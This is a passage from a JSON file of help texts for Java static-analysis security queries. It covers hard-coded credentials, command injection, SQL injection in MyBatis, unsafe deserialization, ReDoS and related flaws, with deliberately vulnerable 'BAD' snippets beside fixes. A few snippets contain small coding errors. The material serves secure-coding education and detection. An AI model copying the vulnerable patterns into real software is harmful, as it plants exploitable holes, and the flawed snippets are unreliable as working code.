    "help": "# Hard-coded credential in sensitive call\nIncluding unencrypted hard-coded authentication credentials in source code is dangerous because the credentials may be easily discovered. For example, the code may be open source, or it may be leaked or accidentally revealed, making the credentials visible to an attacker. This, in turn, might enable them to gain unauthorized access, or to obtain privileged information.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code. Instead, place them in configuration files, environment variables or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\n\n## Example\nThe following code example connects to a database using a hard-coded user name and password:\n\n\n```java\nprivate static final String p = \"123456\"; // hard-coded credential\n\npublic static void main(String[] args) throws SQLException {\n    String url = \"jdbc:mysql://localhost/test\";\n    String u = \"admin\"; // hard-coded credential\n\n    getConn(url, u, p);\n}\n\npublic static void getConn(String url, String v, String q) throws SQLException {\n    DriverManager.getConnection(url, v, q); // sensitive call\n}\n\n```\nInstead, the user name and password could be supplied through environment variables, which can be set externally without hard-coding credentials in the source code.\n\n\n## References\n* OWASP: [Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n"
  },
  "java/socket-auth-race-condition": {
    "name": "Race condition in socket authentication",
    "description": "Opening a socket after authenticating via a different channel may allow an attacker to connect to the port first.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.2,
    "precision": "medium",
    "id": "java/socket-auth-race-condition",
    "tags": [
      "security",
      "external/cwe/cwe-421"
    ],
    "filename": "e5fee539-SocketAuthRace",
    "language": "java",
    "help": "# Race condition in socket authentication\nA common pattern is to have a channel of communication open with a user, and then to open another channel, for example to transfer data. However, if user authentication is done over the original channel rather than the alternate channel, then an attacker may be able to connect to the alternate channel before the legitimate user does. This allows the attacker to impersonate the user by \"piggybacking\" on any previous authentication.\n\n\n## Recommendation\nWhen opening an alternate channel for an authenticated user (for example, a Java `Socket`), always authenticate the user over the new channel.\n\n\n## Example\nThis example shows two ways of opening a connection for a user. In the first example, authentication is determined based on materials that the user has already provided (for example, their username and/or password), and then a new channel is opened. However, no authentication is done over the new channel, and so an attacker could connect to it before the user connects.\n\nIn the second example, authentication is done over the socket channel itself, which verifies that the newly connected user is in fact the user that was expected.\n\n\n```java\npublic void doConnect(int desiredPort, String username) {\n\tServerSocket listenSocket = new ServerSocket(desiredPort);\n\n\tif (isAuthenticated(username)) {\n\t\tSocket connection1 = listenSocket.accept();\n\t\t// BAD: no authentication over the socket connection\n\t\tconnection1.getOutputStream().write(secretData);\n\t}\n}\n\npublic void doConnect(int desiredPort, String username) {\n\tServerSocket listenSocket = new ServerSocket(desiredPort);\n\n\tSocket connection2 = listenSocket.accept();\n\t// GOOD: authentication happens over the socket\n\tif (doAuthenticate(connection2, username)) {\n\t\tconnection2.getOutputStream().write(secretData);\n\t}\n}\n```\n\n## References\n* Common Weakness Enumeration: [CWE-421](https://cwe.mitre.org/data/definitions/421.html).\n"
  },
  "java/command-line-injection-experimental": {
    "name": "Uncontrolled command line (experimental sinks)",
    "description": "Using externally controlled strings in a command line is vulnerable to malicious changes in the strings (includes experimental sinks).",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/command-line-injection-experimental",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088"
    ],
    "filename": "f0ce0668-ExecTainted",
    "language": "java",
    "help": "# Uncontrolled command line (experimental sinks)\nCode that passes user input directly to `Runtime.exec`, or some other library routine that executes a command, allows the user to execute malicious code.\n\n\n## Recommendation\nIf possible, use hard-coded string literals to specify the command to run or library to load. Instead of passing the user input directly to the process or library function, examine the user input and then choose among hard-coded string literals.\n\nIf the applicable libraries or commands cannot be determined at compile time, then add code to verify that the user input string is safe before using it.\n\n\n## Example\nThe following example shows code that takes a shell script that can be changed maliciously by a user, and passes it straight to `Runtime.exec` without examining it first.\n\n\n```java\nclass Test {\n    public static void main(String[] args) {\n        String script = System.getenv(\"SCRIPTNAME\");\n        if (script != null) {\n            // BAD: The script to be executed is controlled by the user.\n            Runtime.getRuntime().exec(script);\n        }\n    }\n}\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* SEI CERT Oracle Coding Standard for Java: [IDS07-J. Sanitize untrusted data passed to the Runtime.exec() method](https://wiki.sei.cmu.edu/confluence/display/java/IDS07-J.+Sanitize+untrusted+data+passed+to+the+Runtime.exec()+method).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n"
  },
  "java/insecure-rmi-jmx-server-initialization": {
    "name": "InsecureRmiJmxAuthenticationEnvironment",
    "description": "This query detects if a JMX/RMI server is created with a potentially dangerous environment, which could lead to code execution through insecure deserialization.",
    "kind": "problem",
    "problem.severity": "error",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-665"
    ],
    "precision": "high",
    "id": "java/insecure-rmi-jmx-server-initialization",
    "filename": "8b386608-InsecureRmiJmxEnvironmentConfiguration",
    "language": "java",
    "help": "# InsecureRmiJmxAuthenticationEnvironment\nFor special use cases some applications may implement a custom service which handles JMX-RMI connections.\n\nWhen creating such a custom service, a developer should pass a certain environment configuration to the JMX-RMI server initialization, as otherwise the JMX-RMI service is susceptible to an unsafe deserialization vulnerability.\n\nThis is because the JMX-RMI service allows attackers to supply arbitrary objects to the service authentication method, resulting in the attempted deserialization of an attacker-controlled object. In the worst case scenario this could allow an attacker to achieve remote code execution within the context of the application server.\n\nBy setting the appropriate environment, the deserialization can be controlled via a deserialization filter.\n\n\n## Recommendation\nDuring the creation of a custom JMX-RMI service an environment should be supplied that sets a deserialization filter. Ideally this filter should be as restrictive as possible, for example to only allow the deserialization of `java.lang.String`.\n\nThe filter can be configured by setting the key `jmx.remote.rmi.server.credentials.filter.pattern` (given by the constant `RMIConnectorServer.CREDENTIALS_FILTER_PATTERN`). The filter should (ideally) only allow java.lang.String and disallow all other classes for deserialization: (`\"java.lang.String;!*\"`).\n\nThe key-value pair can be set as following:\n\n\n```java\nString stringsOnlyFilter = \"java.lang.String;!*\"; // Deny everything but java.lang.String\n\nMap<String, Object> env = new HashMap<String, Object>;\nenv.put(RMIConnectorServer.CREDENTIALS_FILTER_PATTERN, stringsOnlyFilter);\n```\nFor applications using Java 6u113 to 9:\n\n\n```java\n// This is deprecated in Java 10+ !\nMap<String, Object>; env = new HashMap<String, Object>;\nenv.put ( \n  \"jmx.remote.rmi.server.credential.types\",\n    new String[]{\n     String[].class.getName(),\n     String.class.getName()\n   }\n );\n```\nPlease note that the JMX-RMI service is vulnerable in the default configuration. For this reason an initialization with a `null` environment is also vulnerable.\n\n\n## Example\nThe following examples show how an JMX-RMI service can be initialized securely.\n\nThe first example shows how an JMX server is initialized securely with the `JMXConnectorServerFactory.newJMXConnectorServer()` call.\n\n\n```java\nimport java.io.IOException;\nimport java.lang.management.ManagementFactory;\nimport java.rmi.registry.LocateRegistry;\nimport java.util.HashMap;\nimport java.util.Map;\n\nimport javax.management.MBeanServer;\nimport javax.management.remote.JMXConnectorServerFactory;\nimport javax.management.remote.JMXServiceURL;\n\npublic class CorrectJmxInitialisation {\n\n    public void initAndStartJmxServer() throws IOException{\n        int jmxPort = 1919;\n        LocateRegistry.createRegistry(jmxPort);\n\n        /* Restrict the login function to String Objects only (see CVE-2016-3427) */\n        Map<String, Object> env = new HashMap<String, Object>();\n        // For Java 10+\n        String stringsOnlyFilter = \"java.lang.String;!*\"; // Deny everything but java.lang.String\n        env.put(RMIConnectorServer.CREDENTIALS_FILTER_PATTERN, stringsOnlyFilter);\n                \n        /* Java 9 or below:\n        env.put(\"jmx.remote.rmi.server.credential.types\",\n                new String[] { String[].class.getName(), String.class.getName() });\n        */\n        \n        MBeanServer beanServer = ManagementFactory.getPlatformMBeanServer();\n\n        JMXServiceURL jmxUrl = new JMXServiceURL(\"service:jmx:rmi:///jndi/rmi://localhost:\" + jmxPort + \"/jmxrmi\");\n\n        // Create JMXConnectorServer in a secure manner\n        javax.management.remote.JMXConnectorServer connectorServer = JMXConnectorServerFactory\n                .newJMXConnectorServer(jmxUrl, env, beanServer);\n\n        connectorServer.start();\n    }\n}\n\n```\nThe second example shows how a JMX Server is initialized securely if the `RMIConnectorServer` class is used.\n\n\n```java\npublic class CorrectRmiInitialisation {\n    public void initAndStartRmiServer(int port, String hostname, boolean local) {\n        MBeanServerForwarder authzProxy = null;\n\n        env.put(\"jmx.remote.x.daemon\", \"true\");\n        \n        /* Restrict the login function to String Objects only (see CVE-2016-3427) */\n        Map<String, Object> env = new HashMap<String, Object>();\n        // For Java 10+\n        String stringsOnlyFilter = \"java.lang.String;!*\"; // Deny everything but java.lang.String\n        env.put(RMIConnectorServer.CREDENTIALS_FILTER_PATTERN, stringsOnlyFilter);\n                \n        /* Java 9 or below\n        env.put(\"jmx.remote.rmi.server.credential.types\",\n                new String[] { String[].class.getName(), String.class.getName() });\n        */\n        \n        int rmiPort = Integer.getInteger(\"com.sun.management.jmxremote.rmi.port\", 0);\n        RMIJRMPServerImpl server = new RMIJRMPServerImpl(rmiPort,\n                (RMIClientSocketFactory) env.get(RMIConnectorServer.RMI_CLIENT_SOCKET_FACTORY_ATTRIBUTE),\n                (RMIServerSocketFactory) env.get(RMIConnectorServer.RMI_SERVER_SOCKET_FACTORY_ATTRIBUTE), env);\n\n        JMXServiceURL serviceURL = new JMXServiceURL(\"rmi\", hostname, rmiPort);\n\n        // Create RMI Server\n        RMIConnectorServer jmxServer = new RMIConnectorServer(serviceURL, env, server,\n                ManagementFactory.getPlatformMBeanServer());\n\n        jmxServer.start();\n\n    }\n}\n\n```\n\n## References\n* Deserialization of arbitrary objects could lead to remote code execution as described following: [OWASP Deserialization of untrusted data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data).\n* Issue discovered in Tomcat (CVE-2016-8735): [OWASP ESAPI](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-8735).\n* [Oracle release notes](https://www.oracle.com/java/technologies/javase/8u91-relnotes.html#bugfixes-8u91): New attribute for JMX RMI JRMP servers.\n* Java 10 API specification for [RMIConnectorServer.CREDENTIALS_FILTER_PATTERN](https://docs.oracle.com/javase/10/docs/api/javax/management/remote/rmi/RMIConnectorServer.html#CREDENTIALS_FILTER_PATTERN)\n* The Java API specification for [RMIConnectorServer.CREDENTIAL_TYPES](https://docs.oracle.com/javase/10/docs/api/javax/management/remote/rmi/RMIConnectorServer.html#CREDENTIAL_TYPES). Please note that this field is deprecated since Java 10.\n* Common Weakness Enumeration: [CWE-665](https://cwe.mitre.org/data/definitions/665.html).\n"
  },
  "java/mybatis-xml-sql-injection": {
    "name": "SQL injection in MyBatis Mapper XML",
    "description": "Constructing a dynamic SQL statement with input that comes from an untrusted source could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/mybatis-xml-sql-injection",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-089"
    ],
    "filename": "973ff15a-MyBatisMapperXmlSqlInjection",
    "language": "java",
    "help": "# SQL injection in MyBatis Mapper XML\nMyBatis allows operating the database by creating XML files to construct dynamic SQL statements. If the syntax `${param}` is used in those statements, and `param` is under the user's control, attackers can exploit this to tamper with the SQL statements or execute arbitrary SQL commands.\n\n\n## Recommendation\nWhen writing MyBatis mapping statements, try to use the syntax `#{xxx}`. If the syntax `${xxx}` must be used, any parameters included in it should be sanitized to prevent SQL injection attacks.\n\n\n## Example\nThe following sample shows several bad and good examples of MyBatis XML files usage. In `bad1`, `bad2`, `bad3`, `bad4`, and `bad5` the syntax `${xxx}` is used to build dynamic SQL statements, which causes a SQL injection vulnerability. In `good1`, the program uses the `${xxx}` syntax, but there are subtle restrictions on the data, while in `good2` the syntax `#{xxx}` is used. In both cases the SQL injection vulnerability is prevented.\n\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\"\n  \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\" >\n<mapper namespace=\"SqlInjectionMapper\">\n\n  <resultMap id=\"BaseResultMap\" type=\"Test\">\n    <id column=\"id\" jdbcType=\"INTEGER\" property=\"id\"/>\n    <result column=\"name\" jdbcType=\"VARCHAR\" property=\"name\"/>\n    <result column=\"pass\" jdbcType=\"VARCHAR\" property=\"pass\"/>\n  </resultMap>\n\n  <sql id=\"Update_By_Example_Where_Clause\">\n    <where>\n      <if test=\"name != null\">\n        -- bad\n        and name = ${name}\n      </if>\n      <if test=\"id != null\">\n        and id = #{id}\n      </if>\n    </where>\n  </sql>\n\n  <select id=\"bad1\" parameterType=\"java.lang.String\" resultMap=\"BaseResultMap\">\n    -- bad\n    select id,name from test where name like '%${name}%'\n  </select>\n\n  <select id=\"bad2\" parameterType=\"java.lang.String\" resultMap=\"BaseResultMap\">\n    -- bad\n    select id,name from test order by ${name} desc\n  </select>\n\n  <select id=\"bad3\" parameterType=\"java.lang.String\" resultMap=\"BaseResultMap\">\n    -- bad\n    select id,name from test where name in ${name}\n  </select>\n\n  <update id=\"bad4\" parameterType=\"Test\">\n    update test\n    <set>\n      <if test=\"pass != null\">\n        pass = #{pass},\n      </if>\n    </set>\n    <if test=\"_parameter != null\">\n      -- bad\n      <include refid=\"Update_By_Example_Where_Clause\" />\n    </if>\n  </update>\n\n  <insert id=\"bad5\" parameterType=\"Test\">\n    insert into test (name, pass)\n    <trim prefix=\"values (\" suffix=\")\" suffixOverrides=\",\">\n      <if test=\"name != null\">\n        -- bad\n        name = ${name},\n      </if>\n      <if test=\"pass != null\">\n        -- bad\n        pass = ${pass},\n      </if>\n    </trim>\n  </insert>\n\n  <select id=\"good1\" parameterType=\"java.lang.Integer\" resultMap=\"BaseResultMap\">\n    -- good\n    select id,name from test where id = ${id}\n  </select>\n\n  <select id=\"good2\" parameterType=\"java.lang.String\" resultMap=\"BaseResultMap\">\n    -- good\n    select id,name from test where name = #{name}\n  </select>\n</mapper>\n\n```\n\n## References\n* Fortify: [SQL Injection: MyBatis Mapper](https://vulncat.fortify.com/en/detail?id=desc.config.java.sql_injection_mybatis_mapper).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n"
  },
  "java/unsafe-deserialization-spring-exporter-in-configuration-class": {
    "name": "Unsafe deserialization with Spring's remote service exporters.",
    "description": "A Spring bean, which is based on RemoteInvocationSerializingExporter, initializes an endpoint that uses ObjectInputStream to deserialize incoming data. In the worst case, that may lead to remote code execution.",
    "kind": "problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/unsafe-deserialization-spring-exporter-in-configuration-class",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-502"
    ],
    "filename": "094f8cd6-UnsafeSpringExporterInConfigurationClass",
    "language": "java",
    "help": "# Unsafe deserialization with Spring's remote service exporters.\nThe Spring Framework provides several classes for creating remote service exporters. Under the hood, the exporters use various deserialization mechanisms such as `ObjectInputStream` or Hessian. Deserializing untrusted data is easily exploitable and in many cases allows an attacker to execute arbitrary code. If a remote attacker can reach endpoints created by the exporters, it results in remote code execution in the worst case.\n\nExamples of unsafe exporters include: `HttpInvokerServiceExporter`, `SimpleHttpInvokerServiceExporter`, `RmiServiceExporter`, `HessianServiceExporter`.\n\nCVE-2016-1000027 has been assigned to this issue in the Spring Framework. It is regarded as a design limitation, and can be mitigated but not fixed outright.\n\n\n## Recommendation\nAvoid using unsafe service exporters. Instead, use other message formats for API endpoints (for example, JSON), but make sure that the underlying deserialization mechanism is properly configured so that deserialization attacks are not possible. If the vulnerable exporters can not be replaced, consider using global deserialization filters introduced in JEP 290.\n\n\n## Example\nThe following example shows how a vulnerable HTTP endpoint can be defined using `HttpInvokerServiceExporter` and Spring annotations:\n\n\n```java\n@Configuration\npublic class Server {\n\n    @Bean(name = \"/account\")\n    HttpInvokerServiceExporter accountService() {\n        HttpInvokerServiceExporter exporter = new HttpInvokerServiceExporter();\n        exporter.setService(new AccountServiceImpl());\n        exporter.setServiceInterface(AccountService.class);\n        return exporter;\n    }\n\n}\n\nclass AccountServiceImpl implements AccountService {\n\n    @Override\n    public String echo(String data) {\n        return data;\n    }\n}\n\ninterface AccountService {\n    String echo(String data);\n}\n```\n\n## References\n* OWASP: [Deserialization of untrusted data](https://www.owasp.org/index.php/Deserialization_of_untrusted_data).\n* Spring Framework API documentation: [RemoteInvocationSerializingExporter class](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/rmi/RemoteInvocationSerializingExporter.html)\n* Spring Framework API documentation: [HttpInvokerServiceExporter class](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html)\n* National Vulnerability Database: [CVE-2016-1000027](https://nvd.nist.gov/vuln/detail/CVE-2016-1000027)\n* Tenable Research Advisory: [\\[R2\\] Pivotal Spring Framework HttpInvokerServiceExporter readRemoteInvocation Method Untrusted Java Deserialization](https://www.tenable.com/security/research/tra-2016-20)\n* Spring Framework bug tracker: [Sonatype vulnerability CVE-2016-1000027 in Spring-web project](https://github.com/spring-projects/spring-framework/issues/24434)\n* OpenJDK: [JEP 290: Filter Incoming Serialization Data](https://openjdk.java.net/jeps/290)\n* Common Weakness Enumeration: [CWE-502](https://cwe.mitre.org/data/definitions/502.html).\n"
  },
  "java/redos": {
    "name": "Inefficient regular expression",
    "description": "A regular expression that requires exponential time to match certain inputs can be a performance bottleneck, and may be vulnerable to denial-of-service attacks.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "java/redos",
    "tags": [
      "security",
      "external/cwe/cwe-1333",
      "external/cwe/cwe-730",
      "external/cwe/cwe-400"
    ],
    "filename": "3a0d1a85-ReDoS",
    "language": "java",
    "help": "# Inefficient regular expression\nSome regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, or even allow a malicious user to perform a Denial of Service (\"DoS\") attack by crafting an expensive input string for the regular expression to match.\n\nThe regular expression engine provided by Java uses a backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or even exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.\n\nTypically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.\n\nNote that Java versions 9 and above have some mitigations against ReDoS; however they aren't perfect and more complex regular expressions can still be affected by this problem.\n\n\n## Recommendation\nModify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time-complexity does not matter. Alternatively, an alternate regex library that guarantees linear time execution, such as Google's RE2J, may be used.\n\n\n## Example\nConsider this regular expression:\n\n```java\n\n^_(__|.)+_$\n```\nIts sub-expression `\"(__|.)+?\"` can match the string `\"__\"` either by the first alternative `\"__\"` to the left of the `\"|\"` operator, or by two repetitions of the second alternative `\".\"` to the right. Thus, a string consisting of an odd number of underscores followed by some other character will cause the regular expression engine to run for an exponential amount of time before rejecting the input.\n\nThis problem can be avoided by rewriting the regular expression to remove the ambiguity between the two branches of the alternative inside the repetition:\n\n```java\n\n^_(__|[^_])+_$\n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).\n* James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).\n* Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "java/android/incomplete-provider-permissions": {
    "name": "Missing read or write permission in a content provider",
    "description": "Android content providers which do not configure both read and write permissions can allow permission bypass.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 8.2,
    "id": "java/android/incomplete-provider-permissions",
    "tags": [
      "security",
      "external/cwe/cwe-926"
    ],
    "precision": "medium",
    "filename": "56f29a97-ContentProviderIncompletePermissions",
    "language": "java",
    "help": "# Missing read or write permission in a content provider\nThe Android manifest file specifies the content providers for the application using `provider` elements. The `provider` element specifies the explicit permissions an application requires in order to access a resource using that provider. You specify the permissions using the `android:readPermission`, `android:writePermission`, or `android:permission` attributes. If you do not specify the permission required to perform an operation, the application will implicitly have access to perform that operation. For example, if you specify only `android:readPermission`, the application must have explicit permission to read data, but requires no permission to write data.\n\n\n## Recommendation\nTo prevent permission bypass, you should create `provider` elements that either specify both the `android:readPermission` and `android:writePermission` attributes, or specify the `android:permission` attribute.\n\n\n## Example\nIn the following two (bad) examples, the provider is configured with only read or write permissions. This allows a malicious application to bypass the permission check by requesting access to the unrestricted operation.\n\n\n```xml\n<manifest ... >\n    <application ...>\n      <!-- BAD: only 'android:readPermission' is set -->\n      <provider\n          android:name=\".MyContentProvider\"\n          android:authorities=\"table\"\n          android:enabled=\"true\"\n          android:exported=\"true\"\n          android:readPermission=\"android.permission.MANAGE_DOCUMENTS\">\n      </provider>\n    </application>\n</manifest>\n\n```\n\n```xml\n<manifest ... >\n    <application ...>\n      <!-- BAD: only 'android:writePermission' is set -->\n      <provider\n          android:name=\".MyContentProvider\"\n          android:authorities=\"table\"\n          android:enabled=\"true\"\n          android:exported=\"true\"\n          android:writePermission=\"android.permission.MANAGE_DOCUMENTS\">\n      </provider>\n    </application>\n</manifest>\n\n```\nIn the following (good) examples, the provider is configured with full permissions, protecting it from a permissions bypass.\n\n\n```xml\n<manifest ... >\n    <application ...>\n      <!-- Good: both 'android:readPermission' and 'android:writePermission' are set -->\n      <provider\n          android:name=\".MyContentProvider\"\n          android:authorities=\"table\"\n          android:enabled=\"true\"\n          android:exported=\"true\"\n          android:writePermission=\"android.permission.MANAGE_DOCUMENTS\"\n          android:readPermission=\"android.permission.MANAGE_DOCUMENTS\">\n      </provider>\n    </application>\n</manifest>\n\n```\n\n```xml\n<manifest ... >\n    <application ...>\n      <!-- Good: 'android:permission' is set  -->\n      <provider\n          android:name=\".MyContentProvider\"\n          android:authorities=\"table\"\n          android:enabled=\"true\"\n          android:exported=\"true\"\n          android:permission=\"android.permission.MANAGE_DOCUMENTS\">\n      </provider>\n    </application>\n</manifest>\n\n```\n\n## References\n* Android Documentation: [Provider element](https://developer.android.com/guide/topics/manifest/provider-element)\n* CVE-2021-41166: [Insufficient permission control in Nextcloud Android app](https://nvd.nist.gov/vuln/detail/CVE-2021-41166)\n* GitHub Security Lab Research: [Insufficient permission control in Nextcloud Android app](https://securitylab.github.com/advisories/GHSL-2021-1007-Nextcloud_Android_app/#issue-2-permission-bypass-in-disklruimagecachefileprovider-ghsl-2021-1008)\n* Common Weakness Enumeration: [CWE-926](https://cwe.mitre.org/data/definitions/926.html).\n"
  },
  "java/concatenated-command-line": {
    "name": "Building a command line with string concatenation",
    "description": "Using concatenated strings in a command line is vulnerable to malicious insertion of special characters in the strings.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "java/concatenated-command-line",
    "tags": [
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088"
    ],
    "filename": "f03693da-ExecUnescaped",
    "language": "java",
    "help": "# Building a command line with string concatenation\nCode that builds a command line by concatenating strings that have been entered by a user allows the user to execute malicious code.\n\n\n## Recommendation\nExecute external commands using an array of strings rather than a single string. By using an array, many possible vulnerabilities in the formatting of the string are avoided.\n\n\n## Example\nIn the following example, `latlonCoords` contains a string that has been entered by a user but not validated by the program. This allows the user to, for example, append an ampersand (&amp;) followed by the command for a malicious program to the end of the string. The ampersand instructs Windows to execute another program. In the block marked 'BAD', `latlonCoords` is passed to `exec` as part of a concatenated string, which allows more than one command to be executed. However, in the block marked 'GOOD', `latlonCoords` is passed as part of an array, which means that `exec` treats it only as an argument.\n\n\n```java\nclass Test {\n    public static void main(String[] args) {\n        // BAD: user input might include special characters such as ampersands\n        {\n            String latlonCoords = args[1];\n            Runtime rt = Runtime.getRuntime();\n            Process exec = rt.exec(\"cmd.exe /C latlon2utm.exe \" + latlonCoords);\n        }\n\n        // GOOD: use an array of arguments instead of executing a string\n        {\n            String latlonCoords = args[1];\n            Runtime rt = Runtime.getRuntime();\n            Process exec = rt.exec(new String[] {\n                    \"c:\\\\path\\to\\latlon2utm.exe\",\n                    latlonCoords });\n        }\n    }\n}\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* SEI CERT Oracle Coding Standard for Java: [IDS07-J. Sanitize untrusted data passed to the Runtime.exec() method](https://wiki.sei.cmu.edu/confluence/display/java/IDS07-J.+Sanitize+untrusted+data+passed+to+the+Runtime.exec()+method).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n"
  },
  "java/overly-large-range": {
    "name": "Overly permissive regular expression range",
    "description": "Overly permissive regular expression ranges match a wider range of characters than intended. This may allow an attacker to bypass a filter or sanitizer.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 5.0,
    "precision": "high",
    "id": "java/overly-large-range",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020"
    ],
    "filename": "462a50c1-OverlyLargeRange",
    "language": "java",
    "help": "# Overly permissive regular expression range\nIt's easy to write a regular expression range that matches a wider range of characters than you intended. For example, `/[a-zA-z]/` matches all lowercase and all uppercase letters, as you would expect, but it also matches the characters: `` [ \\ ] ^ _ ` ``.\n\nAnother common problem is failing to escape the dash character in a regular expression. An unescaped dash is interpreted as part of a range. For example, in the character class `[a-zA-Z0-9%=.,-_]` the last character range matches the 55 characters between `,` and `_` (both included), which overlaps with the range `[0-9]` and is clearly not intended by the writer.\n\n\n## Recommendation\nAvoid any confusion about which characters are included in the range by writing unambiguous regular expressions. Always check that character ranges match only the expected characters.\n\n\n## Example\nThe following example code is intended to check whether a string is a valid 6 digit hex color.\n\n```java\n\nimport java.util.regex.Pattern\npublic class Tester {\n    public static boolean is_valid_hex_color(String color) {\n        return Pattern.matches(\"#[0-9a-fA-f]{6}\", color);\n    }\n}\n\n```\nHowever, the `A-f` range is overly large and matches every uppercase character. It would parse a \"color\" like `#XXYYZZ` as valid.\n\nThe fix is to use an uppercase `A-F` range instead.\n\n```javascript\n\nimport java.util.regex.Pattern\npublic class Tester {\n    public static boolean is_valid_hex_color(String color) {\n        return Pattern.matches(\"#[0-9a-fA-F]{6}\", color);\n    }\n}\n\n```\n\n## References\n* GitHub Advisory Database: [CVE-2021-42740: Improper Neutralization of Special Elements used in a Command in Shell-quote](https://github.com/advisories/GHSA-g4rg-993r-mgx7)\n* wh0.github.io: [Exploiting CVE-2021-42740](https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html)\n* Yosuke Ota: [no-obscure-range](https://ota-meshi.github.io/eslint-plugin-regexp/rules/no-obscure-range.html)\n* Paul Boyd: [The regex \\[,-.\\]](https://pboyd.io/posts/comma-dash-dot/)\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "java/error-message-exposure": {
    "name": "Information exposure through an error message",
    "description": "Information from an error message propagates to an external user. Error messages can unintentionally reveal implementation details that are useful to an attacker for developing a subsequent exploit.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 5.4,
    "precision": "high",
    "id": "java/error-message-exposure",
    "tags": [
      "security",
      "external/cwe/cwe-209"
    ],
    "filename": "f818b028-SensitiveDataExposureThroughErrorMessage",
    "language": "java",
    "help": "# Information exposure through an error message\nThe error message at the top of a stack trace can include information such as server-side file names and SQL code that the application relies on, allowing an attacker to fine-tune a subsequent injection attack.\n\n\n## Recommendation\nSend the user a more generic error message that reveals less information. Either suppress the error message entirely, or log it only on the server.\n\n\n## Example\nIn the following example, an exception is handled in two different ways. In the first version, labeled BAD, the exception is sent back to the remote user using the `getMessage()` method. As such, the user is able to see a detailed error message, which may contain sensitive information. In the second version, the error message is logged only on the server. That way, the developers can still access and use the error log, but remote users will not see the information.\n\n\n```java\nprotected void doGet(HttpServletRequest request, HttpServletResponse response) {\n\ttry {\n\t\tdoSomeWork();\n\t} catch (NullPointerException ex) {\n\t\t// BAD: printing a exception message back to the response\n\t\tresponse.sendError(\n\t\t\tHttpServletResponse.SC_INTERNAL_SERVER_ERROR,\n\t\t\tex.getMessage());\n\t\treturn;\n\t}\n\n\ttry {\n\t\tdoSomeWork();\n\t} catch (NullPointerException ex) {\n\t\t// GOOD: log the exception message, and send back a non-revealing response\n\t\tlog(\"Exception occurred\", ex.getMessage);\n\t\tresponse.sendError(\n\t\t\tHttpServletResponse.SC_INTERNAL_SERVER_ERROR,\n\t\t\t\"Exception occurred\");\n\t\treturn;\n\t}\n}\n\n```\n\n## References\n* OWASP: [Improper Error Handling](https://owasp.org/www-community/Improper_Error_Handling).\n* CERT Java Coding Standard: [ERR01-J. Do not allow exceptions to expose sensitive information](https://www.securecoding.cert.org/confluence/display/java/ERR01-J.+Do+not+allow+exceptions+to+expose+sensitive+information).\n* Common Weakness Enumeration: 